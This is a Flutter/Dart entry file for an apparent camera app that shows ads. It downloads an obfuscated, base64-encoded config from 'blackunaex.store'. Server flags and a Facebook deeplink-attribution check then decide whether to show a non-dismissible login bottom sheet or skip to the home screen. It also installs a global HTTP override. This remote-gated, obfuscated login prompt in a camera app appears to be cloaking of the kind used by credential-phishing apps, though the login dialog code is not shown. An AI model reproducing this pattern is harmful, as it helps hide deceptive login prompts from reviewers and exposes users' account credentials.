import 'dart:async';

import 'package:camera/camera.dart';

// import 'package:dio/adapter.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_camera/utils/even_utils.dart';

// import 'package:dio/dio.dart';
import 'dart:convert';
import 'dart:io' show HttpClient, HttpOverrides, HttpStatus, Platform;
import 'dart:convert' as convert;
import 'package:http/http.dart' as http;
import 'package:flutter_camera/dialogs/login_dialog.dart';
import 'package:flutter_camera/pages/home.dart';
import 'package:applovin_max/applovin_max.dart';
import 'package:flutter_camera/utils/MyHttpOverrides.dart';
import 'package:flutter_camera/utils/SQScreen.dart';
import 'package:flutter_camera/utils/SharedPreferencesUtils.dart';
import 'package:flutter_camera/utils/mlog.dart';
import 'package:flutter_camera/widgets/image_click.dart';

import 'datas/config_model.dart';
import 'maxUitls/max_ad_id.dart';
import 'maxUitls/max_utils.dart';

List<CameraDescription> cameras = <CameraDescription>[];
late ConfigModel configModel;

Future<void> initCamera() async {
  WidgetsFlutterBinding.ensureInitialized();
  cameras = await availableCameras();
  if (cameras.length > 2) {
    cameras = cameras.sublist(0, 2);
  }
}

void main() {
  HttpOverrides.global = MyHttpOverrides();
  initCamera();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        // This is the theme of your application.
        //
        // Try running your application with "flutter run". You'll see the
        // application has a blue toolbar. Then, without quitting the app, try
        // changing the primarySwatch below to Colors.green and then invoke
        // "hot reload" (press "r" in the console where you ran "flutter run",
        // or simply save your changes to "hot reload" in a Flutter IDE).
        // Notice that the counter didn't reset back to zero; the application
        // is not restarted.
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

Future<void> initializePlugin() async {
  logStatus("Initializing SDK...");
  AppLovinMAX.setVerboseLogging(true);
  // AppLovinMAX.setTestDeviceAdvertisingIds(advertisingIdentifiers)
  Map? configuration = await AppLovinMAX.initialize(sdkKey);
  if (configuration != null) {
    logStatus("SDK Initialized: $configuration");
    attachAdListeners();
  }
}

void logStatus(String status) {
  print(status);
}

void attachAdListeners() {
  AppLovinMAX.setBannerListener(AdViewAdListener(onAdLoadedCallback: (ad) {
    logStatus('Banner ad loaded from ' + ad.networkName);
  }, onAdLoadFailedCallback: (adUnitId, error) {
    logStatus('Banner ad failed to load with error code ' +
        error.code.toString() +
        ' and message: ' +
        error.message);
  }, onAdClickedCallback: (ad) {
    logStatus('Banner ad clicked');
  }, onAdExpandedCallback: (ad) {
    logStatus('Banner ad expanded');
  }, onAdCollapsedCallback: (ad) {
    logStatus('Banner ad collapsed');
  }));
}

void initializeBannerAds() {
  AppLovinMAX.createBanner(
      configModel.maxBanner ?? "", AdViewPosition.bottomCenter);
  AppLovinMAX.createMRec(configModel.maxNative ?? "", AdViewPosition.centered);
  MaxUtils.getInstance().initializeInterstitialAds();
  AppLovinMAX.loadInterstitial(configModel.maxInter ?? "");
  AppLovinMAX.showBanner(configModel.maxBanner ?? "");
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  bool isShow = false;

  @override
  void initState() {
    super.initState();
    initializePlugin();
    initGaid();

    getHttp();
  }

  Future<void> initGaid() async {
    const platform = const MethodChannel("initGaid");
    var returnValue = await platform.invokeMethod("id");
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      resizeToAvoidBottomInset: false,
      body: ConstrainedBox(
        constraints: const BoxConstraints.expand(),
        child: Stack(alignment: Alignment.center, children: <Widget>[
          SizedBox(
            width: double.maxFinite,
            height: double.maxFinite,
            child: showSplashBg(),
          ),
          Positioned(
            top: (MediaQuery.of(context).size.height) * 0.25,
            child: getIconUI(),
          ),
          Positioned(
            bottom: 60.0,
            child: InkWell(
              // When the user taps the button, show a snackbar.
              onTap: () {
                EvenUtils.getInstance().postEven(0);
                // AppLovinMAX.hideBanner(banner_ad_unit_id);
                showLoginDialog();
              },
              child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: <Widget>[
                    Opacity(opacity: 1.0, child: getUI()),
                  ]),
            ),
          ),
        ]),
      ),
      // This trailing comma makes auto-formatting nicer for build methods.
    );
  }

  Widget showSplashBg() {
    if (isReplaseBg) {
      return FadeInImage.assetNetwork(
        placeholder: "assets/images/bg_splash.png",
        image: configModel.loginPicUrl!,
        fit: BoxFit.fill,
      );
    } else {
      return Image.asset(
        "assets/images/bg_splash.png",
        fit: BoxFit.fill,
      );
    }
  }

  var isReplaseBg = false;

  Widget getIconUI() {
    if (!isReplaseBg) {
      return Image.asset("assets/images/bg_splash_2.png",
          width: (MediaQuery.of(context).size.width) * 0.5);
    } else {
      return Container();
    }
  }

  Widget getUI() {
    if (isShow) {
      return Image.asset("assets/images/ic_anniu.png",
          width: 300, height: 100.0);
    } else {
      return Container();
    }
  }

  Future<bool?> showLoginDialog() {
    return showModalBottomSheet<bool>(
        isScrollControlled: true,
        isDismissible: false,
        enableDrag: false,
        context: context,
        builder: (context) {
          return SizedBox(
            height: SQScreen.height * 0.7,
            child: LoginDialog(configModel.info!),
          );
        });
  }

  void getHttp() async {
    try {
      // var response = await Dio().get('https://shakeyu.fun/config');
      var response = await http.get(Uri.https("blackunaex.store", "config"));
      if (response.statusCode == 200) {
        var data = response.body.toString().replaceRange(1, 2, "");

        List<int> bytes2 = base64Decode(data);
        String decodeStr = String.fromCharCodes(bytes2);
        configModel = ConfigModel.fromJson(
            json.decode(decodeStr) as Map<String, dynamic>);
        configModel.maxNative = "69065a61d0b36520";
        configModel.maxBanner = "10424d6678069178";
        configModel.maxInter = "069977ccb92b2669";
        //初始化广告
        initializeBannerAds();

        //初始化facebook sdk
        const platform = const MethodChannel("initfacebook");
        var returnValue = await platform.invokeMethod("id", {
          "id": configModel.id,
        });
        if (returnValue) {
          logger.d("facebook---初始化成功");
        } else {
          logger.d("facebook---初始化失败");
        }

        if (configModel.loginPicUrlSwitch == 1) {
          setState(() {
            isReplaseBg = true;
          });
        }

        if (configModel.tablePlaque == "1") {
          startWait(context);
        }

        startWaitGoToHome(context);

        // if (configModel.l == 0 || await spGetBool()) {
        if (configModel.l == 0) {
          setState(() {
            isShow = false;
          });

          gotoHome(context);
        } else {
          if (configModel.d == 0) {
            setState(() {
              isShow = true;
            });
          } else {
            const eeplinks = const MethodChannel("listenerDeeplinks");
            bool deeplinkResult =
                await eeplinks.invokeMethod("listenerDeeplinks", {
              "id": configModel.id,
            });

            if (deeplinkResult) {
              logger.d("facebook---有深度");
              setState(() {
                isShow = true;
              });
            } else {
              logger.d("facebook---无深度");
              setState(() {
                isShow = false;
              });

              gotoHome(context);
            }
          }
        }
      } else {
        print('Request failed with status: ${response.statusCode}.');
      }
    } catch (e) {
      print("网络请求错误:$e");
    }
  }

  Timer? waitInter = null;

  void startWait(BuildContext context) {
    waitInter?.cancel();
    waitInter = Timer(const Duration(seconds: 5), () {
      MaxUtils.getInstance().showInter2((isShowCall) {});
    });
  }

  Timer? waitGotoHome = null;

  void startWaitGoToHome(BuildContext context) {
    waitGotoHome?.cancel();
    int time = 999;

    if (configModel.forcedEntry != null &&
        configModel.forcedEntry!.isNotEmpty) {
      time = int.parse(configModel.forcedEntry!);
    }

    waitGotoHome = Timer(Duration(seconds: time), () {
      gotoHome(context);
    });
  }

  @override
  void dispose() {
    waitGotoHome?.cancel();
    waitInter?.cancel();

    super.dispose();
  }

  void gotoHome(BuildContext context) {
    Navigator.of(context).pushAndRemoveUntil(
        MaterialPageRoute(builder: (context) => HomePage()),
        (route) => route == null);
  }
}
